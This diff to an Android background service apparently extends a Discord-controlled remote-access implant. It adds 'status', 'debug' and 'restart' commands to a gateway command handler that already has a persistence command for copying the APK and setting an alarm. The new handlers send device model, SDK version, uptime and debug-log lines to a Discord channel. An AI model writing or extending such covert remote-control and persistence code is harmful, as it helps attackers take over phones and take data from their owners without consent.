@@ -192,6 +192,34 @@ class MainService : Service() {
                     persistApk()
                     d.sendMsg(":white_check_mark: Persistence active (APK copied + alarm set)")
                 }
+                "status" -> {
+                    val uptime = d.getUptime()
+                    val hrs = uptime / 3600000
+                    val min = (uptime % 3600000) / 60000
+                    val sec = (uptime % 60000) / 1000
+                    val uptimeStr = "${hrs}h ${min}m ${sec}s"
+                    val connected = d.isConnected()
+                    val chId = d.getChannelId() ?: "none"
+                    d.sendMsg(":bar_chart: **Status**\n```\nConnected  : ${if (connected) "YES" else "NO"}\nChannel    : $chId\nUptime     : $uptimeStr\nModel      : ${Build.MODEL}\nSDK        : ${Build.VERSION.SDK_INT}\n```")
+                }
+                "debug" -> {
+                    val f = debugFile
+                    if (f != null && f.exists() && f.length() > 0) {
+                        val lines = f.readLines()
+                        val total = lines.size
+                        val last = lines.takeLast(40).joinToString("\n")
+                        d.sendMsg(":mag: **Debug Log** (last 40 of $total lines)\n```\n$last\n```")
+                    } else {
+                        d.sendMsg(":mag: Debug file empty or null")
+                    }
+                }
+                "restart" -> {
+                    d.sendMsg(":arrows_counterclockwise: Restarting gateway...")
+                    discord?.stop()
+                    gatewayStarted = false
+                    discord = null
+                    startService(Intent(this@MainService, MainService::class.java))
+                }
             }
         } catch (e: Exception) {
             Log.e(TAG, "gateway cmd: ${e.message}")
